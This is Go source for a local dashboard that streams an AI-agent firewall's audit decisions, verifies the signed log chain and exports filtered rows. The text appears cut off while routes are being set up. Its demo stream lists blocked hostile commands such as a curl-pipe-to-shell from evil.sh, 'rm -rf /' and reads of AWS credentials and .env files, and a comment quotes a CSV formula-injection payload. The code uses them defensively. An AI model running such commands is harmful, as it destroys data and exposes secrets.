// Command nockguard-wall serves a local, private live dashboard for the
// NockGuard audit trail. It tails the append-only audit JSON Lines file and
// streams each policy decision to a browser "wall" in real time, color-coded by
// outcome — turning NockGuard's invisible enforcement into something you watch:
// every tool call an agent attempts, and exactly what the firewall did about it.
//
// It binds to loopback by default (private), embeds its own page (single binary,
// no assets to ship), and has a --demo mode so the wall is alive on first run
// even when no agents are currently hitting NockGuard.
package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/ed25519"
	"embed"
	"encoding/csv"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"
	"unicode/utf8"

	"github.com/nocktechnologies/nockguard/internal/audit"
	"github.com/nocktechnologies/nockguard/internal/forward"
	"github.com/nocktechnologies/nockguard/internal/policy"
	"github.com/nocktechnologies/nockguard/internal/sessionverify"
)

// maxWindow bounds how many recent decisions the wall works with: the history
// replayed to each browser and the window the pulse aggregates over. It keeps a
// large audit trail from flooding the page or re-scanning unboundedly.
const maxWindow = 500

// maxExportTrailBytes is the hard 64 MiB cap for the immutable in-memory trail
// snapshot used by exports. It bounds both memory use and request work.
const maxExportTrailBytes = 64 << 20

// exportMu queues export requests so concurrent clients cannot multiply the
// single 64 MiB snapshot allocation.
var exportMu sync.Mutex

//go:embed index.html
var indexFS embed.FS

// event mirrors internal/audit.Event — one recorded policy decision. NockGuard
// deliberately never records raw tool-call arguments, so neither does the wall.
//
// Severity is NOT part of the audit schema: it is DERIVED on ingest from
// (Decision, Reason) via forward.Severity, tagging each event with a threat tier
// (critical/high/low/none) so the browser can render a secret-exfil block louder
// than a routine allowlist deny without re-deriving the classification in JS.
type event struct {
	Ts       string `json:"ts"`
	Agent    string `json:"agent"`
	Tool     string `json:"tool"`
	Decision string `json:"decision"` // allow | deny | block | ratelimit | hide
	Reason   string `json:"reason,omitempty"`
	Severity string `json:"severity,omitempty"` // derived threat tier, not from audit
	// VerifyState is the tamper-evidence badge for this entry: "ok" (its
	// signature chained clean), "broken" (this is the first entry whose signature
	// failed), or "unknown" (unverifiable — no signing key configured, a demo
	// event, or an entry at/after a chain break). Derived server-side from the
	// existing internal/audit chain verification (see verify.go); never from the
	// browser, which holds no key.
	VerifyState string `json:"verifyState,omitempty"`
	// Verification is added only to export rows. It is "verified" when this
	// export's chain walk covered the row, "failed" after a detected break, or
	// "unsigned" when signing is not configured or the row was not covered.
	Verification string `json:"verification,omitempty"`
	// Source names the enforcement layer that recorded the row: GUARD (the MCP
	// firewall) or LOCK (NockLock's fence). Session is the NockLock session id the
	// row belongs to, when known; it keys the per-session proof badge.
	Source    string `json:"source,omitempty"`
	Session   string `json:"session_id,omitempty"`
	auditLine int    `json:"-"`
}

// classify tags an event with its derived threat tier. Called at every ingest
// point so both the SSE stream and the /pulse aggregate carry the severity.
func classify(ev event) event {
	ev.Source = sourceGuard // stamped here, never trusted from the audit line; Lock rows overwrite it
	ev.Severity = forward.Severity(ev.Decision, ev.Reason)
	return ev
}

// broker is a minimal SSE hub: it fans recorded events out to every connected
// browser.
type broker struct {
	auditPath string // replayed to each newly-connected client as history
	// exportTrailLimit bounds verifier-enabled immutable snapshots. Tests lower
	// it to exercise the boundary without constructing a 64 MiB fixture.
	exportTrailLimit int64
	mu               sync.Mutex
	clients          map[chan event]struct{}

	// verifier holds the server-side trusted key used to verify the audit chain;
	// vsnap caches the most recent full-verify result so per-event badges (replay
	// and tail) can be tagged without re-walking the whole trail per event.
	verifier    *verifier
	proofSigner ed25519.PrivateKey
	vmu         sync.Mutex
	vsnap       verifyReport

	// NockLock side (all zero without --lock-db). lockPub verifies the Lock chain
	// for the session badge. view caches the current snapshot (see wallView)
	// (guarded by smu, held only to read or write the cache); lmu serializes the
	// verification itself so concurrent callers share one run.
	lockDB  string
	lockPub ed25519.PublicKey
	demo    bool
	smu     sync.Mutex
	lmu     sync.Mutex
	builds  int // views built so far (guarded by smu); lets a waiting fresh caller reuse a build that finished while it waited
	view    *wallView

	// Test seams for mutating the live files at each capture boundary.
	// Production leaves both nil.
	afterExportCheckpoint func()
	afterExportSnapshot   func()
	beforeExportRead      func()
}

func newBroker() *broker {
	return &broker{
		clients:          make(map[chan event]struct{}),
		exportTrailLimit: maxExportTrailBytes,
	}
}

// snapshot returns the cached full-verify result.
func (b *broker) snapshot() verifyReport {
	b.vmu.Lock()
	defer b.vmu.Unlock()
	return b.vsnap
}

// refreshSnapshot re-runs the full chain verification over the tailed trail and
// caches the result. Called on startup, on each SSE connect (replay), and by the
// /verify handler.
func (b *broker) refreshSnapshot() verifyReport {
	rep := b.verifier.verify(b.auditPath)
	b.vmu.Lock()
	b.vsnap = rep
	b.vmu.Unlock()
	return rep
}

// tailState is the per-event badge for a LIVE (tailed) event. A live-tailed entry
// has NOT been individually server-verified at tail time, so it is always pending
// re-verify → "unknown". "ok" means server-verified and is assigned only by the
// replay/snapshot path (lineState) once a /verify cycle confirms the entry chains
// clean; "broken" likewise comes from that path when an entry's signature fails.
// A live tip must never inherit "ok" from an intact cached snapshot — a freshly
// appended, not-yet-verified entry would then wear the verified badge for up to a
// poll interval, a false positive. The loud live tamper signal is the
// /verify-driven banner, not the tip badge.
func (b *broker) tailState() string {
	return "unknown"
}

func (b *broker) register(c chan event) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.clients[c] = struct{}{}
}

func (b *broker) unregister(c chan event) {
	b.mu.Lock()
	defer b.mu.Unlock()
	if _, ok := b.clients[c]; ok {
		delete(b.clients, c)
		close(c)
	}
}

func (b *broker) emit(ev event) {
	b.mu.Lock()
	defer b.mu.Unlock()
	for c := range b.clients {
		select {
		case c <- ev:
		default: // slow client — drop one event rather than stall the hub
		}
	}
}

func (b *broker) handleSSE(w http.ResponseWriter, r *http.Request) {
	fl, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "streaming unsupported", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")

	// Replay existing audit history to this client first, so opening the wall
	// shows the full record rather than only decisions that arrive afterward.
	b.replayHistory(w)
	fl.Flush()

	c := make(chan event, 64)
	b.register(c)
	defer b.unregister(c)

	ka := time.NewTicker(20 * time.Second) // keepalive so the stream isn't reaped
	defer ka.Stop()

	for {
		select {
		case <-r.Context().Done():
			return
		case <-ka.C:
			fmt.Fprint(w, ": keepalive\n\n")
			fl.Flush()
		case ev, ok := <-c:
			if !ok {
				return
			}
			line, _ := json.Marshal(ev)
			fmt.Fprintf(w, "data: %s\n\n", line)
			fl.Flush()
		}
	}
}

// replayHistory writes the existing audit lines to a just-connected SSE client,
// oldest first (the page prepends, so newest lands on top). Bounded so a large
// trail can't flood the page. This is what makes opening the wall show the full
// record instead of only decisions that arrive after the page loads.
//
// It reads the current snapshot (see wallView), whose Guard rows were decoded
// from the very bytes its chain walk verified, and tags each entry with its
// VerifyState. The line counter increments on EVERY non-empty line — the same
// rule audit.Verify counts entries by — so the badge index stays aligned with
// the break position even past a line the wall itself can't render.
func (b *broker) replayHistory(w io.Writer) {
	v := b.freshView()
	evs := make([]event, len(v.guardEvs))
	for i, ev := range v.guardEvs {
		ev.VerifyState = lineState(v.rep, ev.auditLine)
		evs[i] = ev
	}
	if b.lockDB != "" {
		evs = mergeByTime(evs, v.lock.events)
	}
	for _, ev := range lastWindow(evs) {
		line, _ := json.Marshal(ev)
		fmt.Fprintf(w, "data: %s\n\n", line)
	}
}

// pulse is a filter-aware, at-a-glance aggregate of the audit window: how many
// tool calls the firewall approved, blocked, or held, plus the busiest agents.
// It mirrors what the Live Wall's pulse header shows so the same numbers are
// available to scripts and headless monitors (GET /pulse), not just the browser.
type pulse struct {
	Approved int `json:"approved"` // allow
	Blocked  int `json:"blocked"`  // deny | block | hide
	Pending  int `json:"pending"`  // ratelimit (held / throttled)
	Total    int `json:"total"`
	// Threat breakdown by severity (forward.Severity). Threats is every non-allow
	// catch (critical+high+low); Critical/High are broken out so the wall's hero
	// counter and critical/high pane don't have to re-classify in the browser.
	Threats   int          `json:"threats"`
	Critical  int          `json:"critical"`
	High      int          `json:"high"`
	Low       int          `json:"low"`
	TopAgents []agentCount `json:"topAgents"`
}

type agentCount struct {
	Agent string `json:"agent"`
	Count int    `json:"count"`
}

// bucket folds a NockGuard decision into one of the pulse's three at-a-glance
// buckets. Anything that isn't a clean allow or a rate-limit hold is treated as
// blocked, so unknown/future enforcement outcomes surface rather than vanish.
func bucket(decision string) string {
	switch decision {
	case "allow":
		return "approved"
	case "ratelimit":
		return "pending"
	default: // deny | block | hide and any unknown enforcement outcome
		return "blocked"
	}
}

// matches reports whether an event survives the wall's three filters: an exact
// decision match, a threat-severity match, and a case-insensitive substring over
// "agent tool". q must already be lower-cased and trimmed (normalizeQuery). This
// is the SINGLE predicate shared by the pulse aggregate (/pulse) and the raw
// export (/export) so their filter semantics can never drift — a mismatch
// between what the wall counts and what it exports would be a lie in an audit
// product.
//
// Severity is filtered off the SAME source the pulse counts with —
// forward.Severity(Decision, Reason), the pure classifier — never a cached
// ev.Severity tag, so a caller that skipped classify() can't split the filter
// from the count. The sentinel severity "threat" means "any live catch"
// (critical|high|low, i.e. not none); an empty string means no severity filter,
// which is distinct from severity="none" (allows / non-catches only).
func matches(ev event, q, decision, severity string, since, until *time.Time) bool {
	if decision != "" && ev.Decision != decision {
		return false
	}
	if severity != "" {
		sev := forward.Severity(ev.Decision, ev.Reason)
		if severity == severityThreat {
			if sev == forward.ThreatNone {
				return false
			}
		} else if sev != severity {
			return false
		}
	}
	if q != "" && !strings.Contains(strings.ToLower(ev.Agent+" "+ev.Tool), q) {
		return false
	}
	// Time filtering: parse ev.Ts as RFC3339 and check bounds.
	if since != nil || until != nil {
		if evTime, err := time.Parse(time.RFC3339, ev.Ts); err == nil {
			if since != nil && evTime.Before(*since) {
				return false
			}
			if until != nil && evTime.After(*until) {
				return false
			}
		}
		// Parse error is silently ignored (event passes the time filter).
	}
	return true
}

// severityThreat is the sentinel ?severity= value meaning "any live catch" —
// critical, high, or low, but not none. It is not one of forward's tiers; it is
// the wall's "THREATS" preset expressed as a filter value so /pulse and /export
// honour it identically to the browser.
const severityThreat = "threat"

// normalizeQuery lower-cases and trims a raw ?q= filter so matches can compare
// against it directly. Every caller normalizes once, up front.
func normalizeQuery(q string) string { return strings.ToLower(strings.TrimSpace(q)) }

// parseTimeFilter parses a time filter value: either an RFC3339 timestamp or a
// Go duration string (e.g., "15m", "1h"). Durations are interpreted as
// "now - duration". Invalid values return nil (no filter applied).
func parseTimeFilter(s string) *time.Time {
	if s == "" {
		return nil
	}
	// Try RFC3339 first
	if t, err := time.Parse(time.RFC3339, s); err == nil {
		return &t
	}
	// Try duration (e.g., "15m", "1h")
	if d, err := time.ParseDuration(s); err == nil {
		t := time.Now().Add(-d)
		return &t
	}
	// Invalid value ignored
	return nil
}

// computePulse aggregates events into a pulse, honouring the same filters the
// wall exposes: a case-insensitive substring over "agent tool", an exact
// decision match, and a threat-severity match. It is O(events-in-window) — a
// single pass, no re-scan.
func computePulse(evs []event, q, decision, severity string, since, until *time.Time) pulse {
	q = normalizeQuery(q)
	byAgent := map[string]int{}
	var p pulse
	for _, ev := range evs {
		if !matches(ev, q, decision, severity, since, until) {
			continue
		}
		p.Total++
		switch bucket(ev.Decision) {
		case "blocked":
			if ev.Decision != decisionUnparseable { // unreadable, not a known block
				p.Blocked++
			}
		case "approved":
			p.Approved++
		case "pending":
			p.Pending++
		default:
			p.Blocked++
		}
		switch forward.Severity(ev.Decision, ev.Reason) {
		case forward.ThreatCritical:
			p.Critical++
			p.Threats++
		case forward.ThreatHigh:
			p.High++
			p.Threats++
		case forward.ThreatLow:
			p.Low++
			p.Threats++
		}
		if ev.Agent != "" {
			byAgent[ev.Agent]++
		}
	}
	p.TopAgents = topAgents(byAgent, 3)
	return p
}

// topAgents returns the n busiest agents, most events first and ties broken by
// name so the ordering (and therefore the tests) is deterministic.
func topAgents(byAgent map[string]int, n int) []agentCount {
	out := make([]agentCount, 0, len(byAgent))
	for a, c := range byAgent {
		out = append(out, agentCount{Agent: a, Count: c})
	}
	sort.Slice(out, func(i, j int) bool {
		if out[i].Count != out[j].Count {
			return out[i].Count > out[j].Count
		}
		return out[i].Agent < out[j].Agent
	})
	if len(out) > n {
		out = out[:n]
	}
	return out
}

// loadEvents reads up to the most recent maxWindow decisions from the audit
// JSONL, oldest first — the same bounded window the wall replays to browsers.
func loadEvents(path string) []event {
	if path == "" {
		return nil
	}
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()
	return loadEventsFrom(f)
}

func loadEventsFrom(r io.Reader) []event {
	var evs []event
	sc := bufio.NewScanner(r)
	sc.Buffer(make([]byte, 0, 64*1024), audit.MaxTrailLineBytes)
	lineNo := 0
	for sc.Scan() {
		if len(bytes.TrimSpace(sc.Bytes())) == 0 {
			continue
		}
		lineNo++
		var ev event
		if json.Unmarshal(sc.Bytes(), &ev) == nil && ev.Decision != "" {
			ev.auditLine = lineNo
			evs = append(evs, classify(ev))
			if len(evs) > maxWindow {
				evs = evs[1:]
			}
		}
	}
	if err := sc.Err(); err != nil {
		log.Printf("error reading audit log: %v", err)
	}
	return evs
}

func loadEventsFromBytes(data []byte) []event {
	return loadEventsFrom(bytes.NewReader(data))
}

// exportVerification translates the full-chain result into the compact receipt
// carried by an export row. A row appended after the walk is not called verified:
// it has not been checked by this export yet.
func exportVerification(rep verifyReport, line int) string {
	if rep.ChainIntact == nil {
		return "unsigned"
	}
	if *rep.ChainIntact {
		if line > rep.EntriesVerified {
			return "unsigned"
		}
		return "verified"
	}
	if rep.BreakAt == nil || line >= *rep.BreakAt {
		return "failed"
	}
	return "verified"
}

// handlePulse serves the current pulse over the persisted audit window as JSON,
// honouring optional ?q= and ?decision= filters. This is the same aggregation
// the browser renders live, exposed for scripting and headless monitoring.
func (b *broker) handlePulse(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	since := parseTimeFilter(q.Get("since"))
	until := parseTimeFilter(q.Get("until"))
	p := computePulse(b.windowEvents(), q.Get("q"), q.Get("decision"), q.Get("severity"), since, until)
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(p)
}

// filterEvents returns the subset of the audit window that survives the wall's
// ?q=/?decision=/?severity= filters, in window order (oldest first). It shares
// the exact matches predicate the pulse aggregate uses, so the export can never
// disagree with the counts the wall shows for the same filter.
func filterEvents(evs []event, q, decision, severity string, since, until *time.Time) []event {
	q = normalizeQuery(q)
	out := make([]event, 0, len(evs))
	for _, ev := range evs {
		if matches(ev, q, decision, severity, since, until) {
			out = append(out, ev)
		}
	}
	return out
}

// csvSafe neutralises spreadsheet formula injection: a field whose first rune
// is a formula lead is treated as a formula by Excel/Sheets, so a reason or
// tool name like "=cmd|'/c calc'!A1" could execute on open. Prefixing a single
// quote forces the cell to render as literal text. NockGuard is a security
// product; its own export must not become an injection vector.
//
// The dangerous leads, per OWASP CSV injection, are more than the ASCII
// operators: a spreadsheet also swallows a leading tab/CR/LF to reach the
// operator behind it, and normalises the full-width Unicode operators
// ＝＋－＠ back to their ASCII form. Those runes are multi-byte, so we decode
// the first rune rather than inspecting the first byte.
func csvSafe(s string) string {
	if s == "" {
		return s
	}
	r, _ := utf8.DecodeRuneInString(s)
	switch r {
	case '=', '+', '-', '@', '\t', '\r', '\n',
		'＝', '＋', '－', '＠':
		return "'" + s
	}
	return s
}

// handleExport serves the current (filtered) audit window as a downloadable
// file so a decision snapshot can land in a compliance report or incident
// write-up. It honours the SAME ?q=/?decision=/?severity= filters as /pulse and
// the browser, defaults to CSV, and serves JSON on ?format=json. It exposes only
// what /events and /pulse already serve over the same loopback bind — the
// audit trail never records raw tool-call arguments — so it widens nothing.
func (b *broker) handleExport(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	since := parseTimeFilter(q.Get("since"))
	until := parseTimeFilter(q.Get("until"))
	proofMode := q.Get("format") == "proof"
	if proofMode {
		if (q.Get("since") != "" && since == nil) || (q.Get("until") != "" && until == nil) {
			http.Error(w, "invalid time filter", http.StatusBadRequest)
			return
		}
		if b.verifier == nil || b.verifier.mode != modeEd25519 || len(b.proofSigner) == 0 {
			http.Error(w, "offline proof requires Ed25519 verification and the trail signing key", http.StatusConflict)
			return
		}
	}
	if !b.verifier.enabled() {
		// No key: nothing can be verified, but the rows still come from one
		// snapshot (Guard and Lock together), never separate reads.
		b.writeViewExport(w, q, b.freshView(), since, until)
		return
	}

	exportMu.Lock()
	defer exportMu.Unlock()
	var lockFile *os.File
	locked := false
	if proofMode {
		var err error
		lockFile, err = os.Open(b.auditPath)
		if err != nil {
			http.Error(w, "audit trail unavailable for offline proof", http.StatusConflict)
			return
		}
		defer lockFile.Close()
		if err := audit.LockShared(lockFile.Fd()); err != nil {
			http.Error(w, "audit trail lock unavailable", http.StatusServiceUnavailable)
			return
		}
		locked = true
		defer func() {
			if locked {
				_ = audit.UnlockFile(lockFile.Fd())
			}
		}()
	}
	capturedAt := time.Now().UTC()
	// Row timestamps have one-second resolution. Exclude the capture second so
	// an append after the snapshot cannot have a timestamp inside the proof.
	captureUntil := capturedAt.Truncate(time.Second).Add(-time.Nanosecond)

	// The writer appends a trail line before advancing the checkpoint under its
	// flock. Capturing the checkpoint first therefore preserves hwm.count <= the
	// captured trail entries when an append lands between these reads.
	hwm, err := os.ReadFile(b.auditPath + ".hwm")
	if err != nil && !os.IsNotExist(err) {
		http.Error(w, "audit checkpoint unavailable", http.StatusServiceUnavailable)
		return
	}
	if b.afterExportCheckpoint != nil {
		b.afterExportCheckpoint()
	}
	f, err := os.Open(b.auditPath)
	if os.IsNotExist(err) {
		if hwm == nil {
			if proofMode {
				http.Error(w, "empty trail has no signed proof", http.StatusConflict)
				return
			}
			writeExport(w, q.Get("format"), nil)
			return
		}
		rep := b.verifier.verifyBytes(nil, hwm)
		if b.afterExportSnapshot != nil {
			b.afterExportSnapshot()
		}
		writeExportFailure(w, q.Get("format"), rep)
		return
	}
	if err != nil {
		http.Error(w, "audit trail unavailable", http.StatusServiceUnavailable)
		return
	}
	defer f.Close()
	info, err := f.Stat()
	if err != nil {
		http.Error(w, "audit trail unavailable", http.StatusServiceUnavailable)
		return
	}
	if info.Size() > b.exportTrailLimit {
		http.Error(w, "audit trail exceeds 64 MiB export limit", http.StatusRequestEntityTooLarge)
		return
	}
	if b.beforeExportRead != nil {
		b.beforeExportRead()
	}
	trail, err := io.ReadAll(io.LimitReader(f, b.exportTrailLimit+1))
	if err != nil {
		http.Error(w, "audit trail unavailable", http.StatusServiceUnavailable)
		return
	}
	if int64(len(trail)) > b.exportTrailLimit {
		http.Error(w, "audit trail exceeds 64 MiB export limit", http.StatusRequestEntityTooLarge)
		return
	}
	if proofMode {
		if err := audit.UnlockFile(lockFile.Fd()); err != nil {
			http.Error(w, "audit trail unlock failed", http.StatusServiceUnavailable)
			return
		}
		locked = false
		if b.afterExportSnapshot != nil {
			b.afterExportSnapshot()
		}
		filters := audit.ExportFilters{Severity: q.Get("severity"), Decision: q.Get("decision"), Query: normalizeQuery(q.Get("q"))}
		if since != nil {
			filters.Since = since.Format(time.RFC3339Nano)
		}
		effectiveUntil := captureUntil
		if until != nil && until.Before(effectiveUntil) {
			effectiveUntil = *until
		}
		filters.Until = effectiveUntil.Format(time.RFC3339Nano)
		proof, err := audit.MakeExportProof(trail, hwm, b.verifier.pub, b.proofSigner, filters, capturedAt)
		if err != nil {
			http.Error(w, fmt.Sprintf("offline proof unavailable: %v", err), http.StatusConflict)
			return
		}
		if len(proof) > audit.MaxExportProofBytes {
			http.Error(w, "offline proof exceeds verifier size limit", http.StatusRequestEntityTooLarge)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Content-Disposition", `attachment; filename="nockguard-wall.proof.json"`)
		_, _ = w.Write(proof)
		return
	}
	if b.afterExportSnapshot != nil {
		b.afterExportSnapshot()
	}
	b.writeViewExport(w, q, b.buildView(guardRead{trail: trail, hwm: hwm}), since, until)
}

// writeViewExport renders one snapshot as an export. Every row, Guard or Lock,
// is filtered and marked from that snapshot alone: a Guard row by its chain walk,
// a Lock row by its session's badge, both computed on the bytes rendered here.
func (b *broker) writeViewExport(w http.ResponseWriter, q url.Values, v *wallView, since, until *time.Time) {
	if b.lockDB != "" {
		status := v.lock.status()
		if status == "ok" && !b.verifier.enabled() {
			status = "unsigned" // no Guard key: nothing is verified, whatever the Lock side says
		}
		w.Header().Set("X-NockGuard-Lock-Verification", status)
	}
	evs := filterEvents(v.events(), q.Get("q"), q.Get("decision"), q.Get("severity"), since, until)
	verdicts := v.lock.verdicts()
	for i := range evs {
		evs[i].Verification = exportRowVerification(v.rep, verdicts, evs[i])
	}
	writeExport(w, q.Get("format"), evs)
}

type exportFailure struct {
	Verification string `json:"verification"`
	verifyReport
}

func writeExportFailure(w http.ResponseWriter, format string, rep verifyReport) {
	w.Header().Set("X-NockGuard-Verification", "failed")
	w.Header().Set("X-NockGuard-Chain-Intact", "false")
	if format == "json" {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusConflict)
		_ = json.NewEncoder(w).Encode(exportFailure{Verification: "failed", verifyReport: rep})
		return
	}
	http.Error(w, "audit trail verification failed", http.StatusConflict)
}

func writeExport(w http.ResponseWriter, format string, evs []event) {
	if format == "json" {
		if evs == nil {
			evs = []event{}
		}
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Content-Disposition", `attachment; filename="nockguard-wall.json"`)
		_ = json.NewEncoder(w).Encode(evs)
		return
	}
	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
	w.Header().Set("Content-Disposition", `attachment; filename="nockguard-wall.csv"`)
	cw := csv.NewWriter(w)
	_ = cw.Write([]string{"ts", "agent", "tool", "decision", "severity", "reason", "verification", "source"})
	for _, ev := range evs {
		_ = cw.Write([]string{
			csvSafe(ev.Ts), csvSafe(ev.Agent), csvSafe(ev.Tool),
			csvSafe(ev.Decision), csvSafe(ev.Severity), csvSafe(ev.Reason), csvSafe(ev.Verification), csvSafe(ev.Source),
		})
	}
	cw.Flush()
	if err := cw.Error(); err != nil {
		log.Printf("error writing export CSV: %v", err)
	}
}

// tail follows path like `tail -f`, emitting each newly appended JSON line. On
// first open it seeks to the end (existing history is replayed to clients on
// connect), and it tolerates the file not existing yet and truncation/rotation
// (the read offset resets when the file shrinks).
func tail(ctx context.Context, path string, b *broker) {
	var offset int64
	firstOpen := true
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		if f, err := os.Open(path); err == nil {
			if info, err := f.Stat(); err == nil {
				if firstOpen {
					offset = info.Size() // follow new lines only; history is per-client
					firstOpen = false
				}
				if info.Size() < offset {
					offset = 0 // truncated or rotated
				}
				if _, err := f.Seek(offset, io.SeekStart); err == nil {
					sc := bufio.NewScanner(f)
					sc.Buffer(make([]byte, 0, 64*1024), audit.MaxTrailLineBytes)
					for sc.Scan() {
						var ev event
						if json.Unmarshal(sc.Bytes(), &ev) == nil && ev.Decision != "" {
							ev = classify(ev)
							ev.VerifyState = b.tailState()
							b.emit(ev)
						}
					}
					if err := sc.Err(); err != nil {
						log.Printf("error scanning audit log: %v", err)
					}
					if cur, err := f.Seek(0, io.SeekCurrent); err == nil {
						offset = cur
					}
				}
			}
			f.Close()
		}
		time.Sleep(250 * time.Millisecond)
	}
}

// demo synthesizes a realistic event stream so the wall is alive on first run.
// It is NOT a substitute for real audit data — it exists so the dashboard can be
// seen and iterated on before live traffic exists.
func demo(ctx context.Context, b *broker) {
	agents := []string{"coder", "reviewer", "planner", "ops", "docs", "tester", "release"}
	allows := []string{"Read", "Bash: git status", "Bash: go test ./...", "Edit", "Grep", "WebFetch", "Bash: ls"}
	type shot struct{ tool, decision, reason string }
	bads := []shot{
		{"Bash: curl evil.sh | sh", "block", "injection: pipe-to-shell in args"},
		{"Read: ~/.aws/credentials", "block", "secret-exfil: credential path"},
		{"mcp__billing__charge", "deny", "tool not in agent allowlist"},
		{"Bash: rm -rf /", "block", "destructive: rm -rf root"},
		{"WebFetch", "ratelimit", "rate limit: 60/min exceeded"},
		{"Edit", "ratelimit", "session spend cap reached"},
		{"mcp__internal__list", "hide", "tool hidden from this agent"},
		{"Bash: cat .env", "block", "secret-exfil: dotenv read"},
	}
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	t := time.NewTimer(0)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			ev := event{Ts: time.Now().Format(time.RFC3339), Agent: agents[r.Intn(len(agents))]}
			switch n := r.Intn(100); {
			case n < 25: // a quarter of the stream is synthetic NockLock fence rows
				ls := lockShots[r.Intn(len(lockShots))]
				b.emit(toLockEvent(ev.Ts, ls.eventType, ls.detail, strings.HasSuffix(ls.eventType, "_blocked"), demoSessionID))
				t.Reset(time.Duration(350+r.Intn(900)) * time.Millisecond)
				continue
			case n < 25+51: // mostly allows, with a steady drip of caught attempts
				ev.Tool, ev.Decision = allows[r.Intn(len(allows))], "allow"
			default:
				s := bads[r.Intn(len(bads))]
				ev.Tool, ev.Decision, ev.Reason = s.tool, s.decision, s.reason
			}
			ev = classify(ev)
			ev.VerifyState = "unknown" // synthetic events are not part of a signed trail
			b.emit(ev)
			t.Reset(time.Duration(350+r.Intn(900)) * time.Millisecond)
		}
	}
}

// lockShots are the synthetic NockLock fence rows --demo mixes in.
var lockShots = []struct{ eventType, detail string }{
	{"file_blocked", "~/.ssh/id_ed25519"},
	{"file_passed", "./src/main.go"},
	{"network_blocked", "paste.example.net:443"},
	{"network_passed", "api.github.com:443"},
	{"secret_blocked", "AWS_SECRET_ACCESS_KEY"},
	{"secret_passed", "NPM_TOKEN"},
}

func defaultAuditPath() string {
	home, _ := os.UserHomeDir()
	return filepath.Join(home, ".nockguard", "logs", "audit.jsonl")
}

func main() {
	addr := flag.String("addr", "127.0.0.1:8787", "address to serve the wall on (loopback = private)")
	agent := flag.String("agent", "", "agent whose per-agent audit trail and public key to watch")
	auditPath := flag.String("audit", defaultAuditPath(), "path to the NockGuard audit JSONL")
	demoMode := flag.Bool("demo", false, "synthesize a sample event stream (use when there is no live traffic)")
	verifyPubEnv := flag.String("verify-ed25519-pub-env", "NOCKGUARD_AUDIT_ED25519_PUB",
		"env var holding the Ed25519 PUBLIC key that verifies the audit chain (server-side trust; never client-supplied). Unset var = verification disabled.")
	verifyKeyEnv := flag.String("verify-key-env", "",
		"env var holding the HMAC key that verifies the audit chain (alternative to Ed25519; server-side trust)")
	proofKeyEnv := flag.String("proof-signing-key-env", "",
		"env var holding the Ed25519 private key used to sign offline export receipts (opt-in)")
	lockDB := flag.String("lock-db", "", "path to a NockLock events.db to show alongside Guard decisions (opened read-only; no discovery)")
	lockPubEnv := flag.String("lock-pub-env", "NOCKLOCK_AUDIT_ED25519_PUB",
		"env var holding the NockLock Ed25519 PUBLIC key for the per-session proof badge. Unset var = badges read UNVERIFIABLE.")
	flag.Parse()
	var agentSet, auditSet, pubEnvSet bool
	flag.Visit(func(f *flag.Flag) {
		switch f.Name {
		case "agent":
			agentSet = true
		case "audit":
			auditSet = true
		case "verify-ed25519-pub-env":
			pubEnvSet = true
		}
	})
	if agentSet {
		if !policy.ValidAgentName(*agent) {
			log.Fatalf("invalid agent name %q: use letters, digits, hyphens, or dots; exclude '.' as the whole name and '..' anywhere", *agent)
		}
		if !auditSet {
			*auditPath = policy.AgentAuditPath(defaultAuditPath(), *agent)
		}
		if !pubEnvSet {
			*verifyPubEnv = policy.AgentPubKeyEnvName(*agent)
		}
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	b := newBroker()
	b.auditPath = *auditPath

	v, verr := newVerifier(*verifyPubEnv, *verifyKeyEnv)
	if verr != nil {
		log.Fatalf("audit verification config: %v", verr)
	}
	b.verifier = v
	if *proofKeyEnv != "" {
		if v.mode != modeEd25519 {
			log.Fatal("offline proof signing requires Ed25519 public-key verification")
		}
		keyHex := os.Getenv(*proofKeyEnv)
		if keyHex == "" {
			log.Fatalf("offline proof signing key %s is unset", *proofKeyEnv)
		}
		priv, err := audit.PrivateKeyFromHex(keyHex)
		if err != nil {
			log.Fatalf("offline proof signing key %s: %v", *proofKeyEnv, err)
		}
		if !bytes.Equal(priv.Public().(ed25519.PublicKey), v.pub) {
			log.Fatalf("offline proof signing key in %s does not match the configured public key", *proofKeyEnv)
		}
		b.proofSigner = priv
		log.Printf("offline proof signing enabled from %s", *proofKeyEnv)
	}
	b.demo = *demoMode
	if *lockDB != "" {
		if *demoMode {
			log.Fatal("--demo and --lock-db cannot be combined: synthetic rows would hide the real Lock badges")
		}
		b.lockDB = *lockDB
		if err := sessionverify.RequireRegularFile(b.lockDB); err != nil {
			if !os.IsNotExist(err) {
				log.Fatalf("--lock-db: %v", err)
			}
			log.Printf("warning: --lock-db %v (the wall will pick it up if it appears)", err)
		}
		if hexKey := strings.TrimSpace(os.Getenv(*lockPubEnv)); hexKey != "" {
			pub, err := audit.PublicKeyFromHex(hexKey)
			if err != nil {
				log.Fatalf("%s: %v", *lockPubEnv, err)
			}
			b.lockPub = pub
		}
		go tailLock(ctx, b.lockDB, b)
	}
	b.refreshSnapshot() // seed the snapshot so live badges have a baseline

	go tail(ctx, *auditPath, b)
	if *demoMode {
		go demo(ctx, b)
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/events", b.handleSSE)
	mux.HandleFunc("/pulse", b.handlePulse)
	mux.HandleFunc("/export", b.handleExport)
	mux.HandleFunc("/verify", b.handleVerify)
	mux.HandleFunc("/sessions", b.handleSessions)
